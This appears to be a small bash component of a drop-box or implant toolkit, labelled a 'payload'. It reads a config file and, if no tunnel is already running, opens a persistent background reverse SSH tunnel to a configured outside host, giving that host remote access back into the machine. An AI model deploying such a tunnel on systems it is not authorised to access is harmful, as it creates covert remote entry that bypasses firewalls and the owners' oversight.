#!/bin/bash

source config

if [ "$PAYLOAD_SSH" = "yes" ] && [ "`ps aux | grep $PAYLOAD_SSH_user@$PAYLOAD_SSH_host | grep ssh`" = "" ]; then
  echo "RUNNING PAYLOAD_SSH"
  ssh -N -f -R $PAYLOAD_SSH_rev -p $PAYLOAD_SSH_port $PAYLOAD_SSH_user@$PAYLOAD_SSH_host
fi
